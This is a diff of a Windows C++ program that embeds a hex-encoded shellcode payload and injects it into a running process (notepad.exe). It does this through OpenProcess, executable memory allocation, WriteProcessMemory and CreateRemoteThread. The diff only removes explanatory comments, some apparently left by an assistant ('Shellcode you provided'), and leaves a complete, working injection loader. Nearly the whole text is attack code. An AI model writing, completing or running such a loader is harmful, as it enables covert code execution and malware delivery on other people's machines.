@@ -3,11 +3,10 @@
 #include <psapi.h>
 #include <vector>
 #include <string>
-#include <tlhelp32.h>  // Include this header to get the necessary process enumeration functions
+#include <tlhelp32.h>
 
 using namespace std;
 
-// Shellcode you provided, formatted as unsigned char payload[]
 unsigned char payload[] = "\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00"
 "\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8"
 "\x48\x8D\x0D\x5D\x00\x00\x00\xFF\xD0\x48\x8D\x15\x5F\x00\x00"
@@ -38,20 +37,19 @@ unsigned char payload[] = "\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\
 "\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6"
 "\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";
 
-// Function to find the process by name
 DWORD FindProcessId(const string& processName) {
     DWORD pid = 0;
     PROCESSENTRY32 pe32;
-    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);  // Ensure tlhelp32.h is included
+    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); 
 
     if (hProcessSnap == INVALID_HANDLE_VALUE) {
         return 0;
     }
 
     pe32.dwSize = sizeof(PROCESSENTRY32);
-    if (Process32First(hProcessSnap, &pe32)) {  // Ensure the necessary functions are defined
+    if (Process32First(hProcessSnap, &pe32)) {  
         do {
-            if (_stricmp(processName.c_str(), pe32.szExeFile) == 0) {  // Use _stricmp instead of stricmp
+            if (_stricmp(processName.c_str(), pe32.szExeFile) == 0) {  
                 pid = pe32.th32ProcessID;
                 break;
             }
@@ -62,7 +60,6 @@ DWORD FindProcessId(const string& processName) {
     return pid;
 }
 
-// Function to inject the shellcode into a process
 void InjectShellcode(DWORD pid, unsigned char* shellcode, SIZE_T shellcodeSize) {
     HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
     if (!hProcess) {
@@ -70,7 +67,6 @@ void InjectShellcode(DWORD pid, unsigned char* shellcode, SIZE_T shellcodeSize) 
         return;
     }
 
-    // Allocate memory in the target process
     LPVOID allocatedMemory = VirtualAllocEx(hProcess, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (!allocatedMemory) {
         cout << "Failed to allocate memory in target process!" << endl;
@@ -78,7 +74,6 @@ void InjectShellcode(DWORD pid, unsigned char* shellcode, SIZE_T shellcodeSize) 
         return;
     }
 
-    // Write the shellcode to the allocated memory
     SIZE_T bytesWritten;
     if (!WriteProcessMemory(hProcess, allocatedMemory, shellcode, shellcodeSize, &bytesWritten)) {
         cout << "Failed to write shellcode to process!" << endl;
@@ -87,7 +82,6 @@ void InjectShellcode(DWORD pid, unsigned char* shellcode, SIZE_T shellcodeSize) 
         return;
     }
 
-    // Create a remote thread in the target process to execute the shellcode
     HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)allocatedMemory, NULL, 0, NULL);
     if (!hThread) {
         cout << "Failed to create remote thread!" << endl;
@@ -97,16 +91,13 @@ void InjectShellcode(DWORD pid, unsigned char* shellcode, SIZE_T shellcodeSize) 
         WaitForSingleObject(hThread, INFINITE);
     }
 
-    // Cleanup
     CloseHandle(hThread);
     CloseHandle(hProcess);
 }
 
 int main() {
-    // Target process name
-    string targetProcess = "notepad.exe"; // Replace with the name of the process you want to inject into
+    string targetProcess = "notepad.exe"; //process
 
-    // Find the target process by name
     DWORD pid = FindProcessId(targetProcess);
     if (pid == 0) {
         cout << "Process not found!" << endl;
@@ -115,7 +106,6 @@ int main() {
 
     cout << "Found process " << targetProcess << " with PID: " << pid << endl;
 
-    // Inject the shellcode
     InjectShellcode(pid, payload, sizeof(payload));
 
     return 0;
